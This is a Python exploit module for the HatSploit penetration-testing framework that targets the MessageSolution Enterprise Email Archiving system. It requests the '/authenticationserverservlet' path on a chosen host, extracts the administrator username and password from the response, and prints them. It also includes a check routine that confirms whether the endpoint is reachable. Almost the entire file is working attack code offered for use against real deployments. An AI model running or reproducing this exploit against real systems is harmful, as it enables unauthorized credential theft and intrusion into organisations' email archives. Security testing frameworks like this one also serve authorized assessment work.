#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.com
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from pex.proto.http import HTTPClient


class HatSploitModule(Module, HTTPClient):
    details = {
        'Category': "exploit",
        'Name': "MessageSolution EEA Credentials Disclosure",
        'Module': "exploit/linux/messagesolution/eea_credentials_disclosure",
        'Authors': ['Ivan Nikolsky (enty8080) - module developer'],
        'Description': "MessageSolution Enterprise Email Archiving Management System credentials disclosure.",
        'Platform': "linux",
        'Rank': "high",
    }

    options = {
        'HOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True,
        },
        'PORT': {
            'Description': "Remote port.",
            'Value': 80,
            'Type': "port",
            'Required': True,
        },
    }

    def exploit(self, remote_host, remote_port):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/authenticationserverservlet',
        )

        username = response.text[
            response.text.find('<username>')
            + len('<username>') : response.text.find('</username>')
        ]
        password = response.text[
            response.text.find('<password>')
            + len('<password>') : response.text.find('</password>')
        ]

        self.print_table("Credentials", ('Username', 'Password'), (username, password))

    def check(self):
        remote_host, remote_port = self.parse_options(self.options)

        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/authenticationserverservlet',
        )

        if not response or response.status_code != 200:
            return False

        return True

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.exploit(remote_host, remote_port)
